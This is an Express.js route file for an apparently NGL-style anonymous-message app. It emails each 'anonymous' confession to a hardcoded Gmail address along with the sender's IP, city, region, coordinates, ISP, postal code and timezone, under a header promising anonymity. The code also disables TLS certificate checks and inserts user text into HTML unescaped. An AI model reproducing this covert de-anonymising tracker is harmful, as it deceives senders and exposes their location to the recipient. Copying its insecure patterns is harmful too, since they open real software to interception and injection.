const express = require('express');
const route = express.Router();
const nodemailer = require('nodemailer');

route.get('/active', (req, res) => {
	res.status(200).json({ message: 'active' });
});

route.post('/setConfession', (req, res) => {
	console.log(req.body);

	const transporter = nodemailer.createTransport({
		host: 'smtp.gmail.com',
		port: 587,
		auth: {
			user: process.env.AUTH_USER,
			pass: process.env.AUTH_PASS,
		},
		tls: { rejectUnauthorized: false },
	});

	transporter.verify(function (error) {
		if (error) {
			res.status(400).json(error);
		} else {
			console.log('Server is ready to take our messages');
		}
	});

	const { username, message, data } = req.body;

	const { ip, city, region, country, loc, org, postal, timezone } = data;

	const mailOptions = {
		from: process.env.AUTH_USER,
		to: 'carlossoncra@gmail.com',
		subject: `😍 ${username} te ha confesado algo!! 💖`,
		html: `
			<div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; width: 100%; max-width: 450px; margin: 20px auto; text-align: center;">
				
				<!-- NGL Card Style -->
				<!-- Added border as fallback for shadow, and forced background color -->
				<div style="border-radius: 25px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.2); border: 1px solid rgba(0,0,0,0.1); background-color: #fffffe !important;">
					
					<!-- Header -->
					<div style="background: linear-gradient(45deg, #FF0055 0%, #FF5500 100%); padding: 35px 20px;">
						<h1 style="color: #ffffff !important; font-size: 24px; font-weight: 800; margin: 0; line-height: 1.2; text-shadow: 0 1px 3px rgba(0,0,0,0.2);">
							¡Mándame mensajes<br>anónimos!
						</h1>
					</div>
					
					<!-- Message Body -->
					<!-- Forced black text and white background with !important -->
					<div style="background-color: #fffffe !important; padding: 40px 30px;">
						<p style="color: #000000 !important; font-size: 22px; font-weight: 700; margin: 0; line-height: 1.4; word-wrap: break-word;">
							${message}
						</p>
					</div>

				</div>

				<br/><br/>
				
				<!-- Metadata -->
				<div style="text-align: left; font-size: 14px; color: #666666 !important; background: #f9f9f9 !important; padding: 20px; border-radius: 12px; line-height: 26px; border: 1px solid #eeeeee;">
					🌐 &nbsp; Ip: <b>${ip}</b><br/>
					🏙️ &nbsp; City: <b>${city}</b><br/>
					🌎 &nbsp; Region: <b>${region}</b><br/>
					🚩 &nbsp; Country: <b>${country}</b><br/>
					🚂 &nbsp; Localization: <b>${loc}</b><br/>
					🗄️ &nbsp; Org: <b>${org}</b><br/>
					📩 &nbsp; Postal: <b>${postal}</b><br/>
					⛅ &nbsp; Timezone: <b>${timezone}</b><br/>
				</div>

			</div>
			<br />`,
	};

	transporter.sendMail(mailOptions, (error) => {
		error
			? res.status(400).json(error)
			: res.status(200).json('😍 Confesión enviada 🤭');
	});
});

module.exports = route;